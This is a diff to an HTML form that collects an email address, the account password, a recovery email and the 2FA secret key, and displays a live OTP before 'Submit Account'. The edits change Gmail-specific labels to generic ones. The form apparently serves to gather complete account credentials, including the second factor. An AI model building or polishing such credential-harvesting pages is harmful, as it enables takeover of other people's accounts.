@@ -249,9 +249,9 @@
     </div>
 
     <div id="stepGmail" class="step-container active">
-        <div class="section-label">Google Account Email</div>
+        <div class="section-label">Your Email Address</div>
         <div id="gmailCard" class="input-card">
-            <input type="email" id="gmailInput" class="field-input" placeholder="esrxample@gmail.com" oninput="checkGmailLive()">
+            <input type="email" id="gmailInput" class="field-input" placeholder="Enter Email Address" oninput="checkGmailLive()">
             <div class="status-icon-wrap">
                 <svg class="tick-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
             </div>
@@ -263,9 +263,9 @@
     </div>
 
     <div id="stepPassword" class="step-container">
-        <div class="section-label">Account Password</div>
+        <div class="section-label">Your Account Password</div>
         <div id="passwordCard" class="input-card">
-            <input type="text" id="passwordInput" class="field-input" placeholder="Enter Password" oninput="checkPasswordLive()">
+            <input type="text" id="passwordInput" class="field-input" placeholder="Enter Account Password" oninput="checkPasswordLive()">
             <div class="status-icon-wrap">
                 <svg class="tick-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
             </div>
@@ -277,9 +277,9 @@
     </div>
 
     <div id="stepRecovery" class="step-container">
-        <div class="section-label">Recovery Email Address</div>
+        <div class="section-label">Your Recovery Email</div>
         <div id="recoveryCard" class="input-card">
-            <input type="email" id="recoveryInput" class="field-input" placeholder="recovery@example.com" oninput="checkRecoveryLive()">
+            <input type="email" id="recoveryInput" class="field-input" placeholder="Enter Recovery Email" oninput="checkRecoveryLive()">
             <div class="status-icon-wrap">
                 <svg class="tick-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
             </div>
@@ -291,9 +291,9 @@
     </div>
 
     <div id="stepTfa" class="step-container">
-        <div class="section-label">2FA Secret Key (Required)</div>
+        <div class="section-label">Your 2FA Secret Key</div>
         <div id="tfaCard" class="input-card">
-            <input type="text" id="tfaInput" class="field-input" placeholder="Enter 16+ Character Secret" oninput="checkTfaLive()">
+            <input type="text" id="tfaInput" class="field-input" placeholder="Enter 2FA Secret Key" oninput="checkTfaLive()">
             <div class="status-icon-wrap">
                 <svg class="tick-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
             </div>
@@ -310,7 +310,7 @@
             
             <div class="summary-row">
                 <div class="row-data-container">
-                    <span class="row-label">Gmail Address:</span>
+                    <span class="row-label">Email:</span>
                     <span class="row-value" id="sumGmail">-</span>
                 </div>
             </div>
@@ -324,7 +324,7 @@
             
             <div class="summary-row">
                 <div class="row-data-container">
-                    <span class="row-label">Recovery Mail:</span>
+                    <span class="row-label">Recovery Email:</span>
                     <span class="row-value" id="sumRecovery">-</span>
                 </div>
             </div>
@@ -338,7 +338,7 @@
 
             <div class="summary-row" style="background: rgba(0,122,255,0.02); align-items: center;">
                 <div class="row-data-container" style="align-items: center;">
-                    <span class="row-label">Live 2FA OTP:</span>
+                    <span class="row-label">2FA Verification Code:</span>
                     <span class="otp-accent" id="sumOtp">Calculating...</span>
                 </div>
                 
@@ -360,7 +360,7 @@
 
         <button id="submitBtn" class="proceed-btn active" style="background:var(--primary) !important;" onclick="submitFinalData()">
             <div id="submitSpinner" class="btn-spinner"></div>
-            <span id="submitBtnText">CONFIRM & SUBMIT</span>
+            <span id="submitBtnText">Submit Account</span>
         </button>
     </div>
 </div>
